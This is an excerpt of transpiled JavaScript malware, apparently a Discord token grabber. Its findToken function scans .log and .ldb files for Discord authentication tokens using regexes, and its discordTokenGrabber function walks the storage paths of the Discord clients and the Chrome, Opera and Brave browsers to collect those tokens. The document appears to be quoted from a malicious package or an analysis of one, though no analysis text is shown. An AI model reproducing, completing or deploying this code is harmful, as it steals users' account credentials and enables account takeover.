...
function findToken(tokenPath) {
  ...
  var tokens = [];
  try {
    _nodeFs["default"].readdirSync(_nodePath["default"].normalize(tokenPath)).map(function (file) {
      if (file.endsWith(".log") || file.endsWith(".ldb")) {
        _nodeFs["default"].readFileSync("".concat(tokenPath, "\\").concat(file), "utf8").split(/\r?\n/).forEach(function (line) {
          var regex = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/g)];
          for (var _i = 0, _regex2 = regex; _i < _regex2.length; _i++) {
            var _regex = _regex2[_i];
            var token = line.match(_regex);
            if (token) {
...
function discordTokenGrabber() {
  ...
  paths = {
    "Discord": _nodePath["default"].join(roaming, "Discord"),
    "Discord Canary": _nodePath["default"].join(roaming, "discordcanary"),
    "Discord PTB": _nodePath["default"].join(roaming, "discordptb"),
    "Google Chrome": _nodePath["default"].join(local, "Google", "Chrome", "User Data", "Default"),
    "Opera": _nodePath["default"].join(roaming, "Opera Software", "Opera Stable"),
    "Brave": _nodePath["default"].join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default")
  };
  var tokens = {};
  ...
  for (var _i2 = 0, _Object$entries = Object.entries(paths); _i2 < _Object$entries.length; _i2++) {
    _loop();
  }
  ...
  }).then(function (_mug) {})["catch"](function (_mug) {});
  return tokens;
}
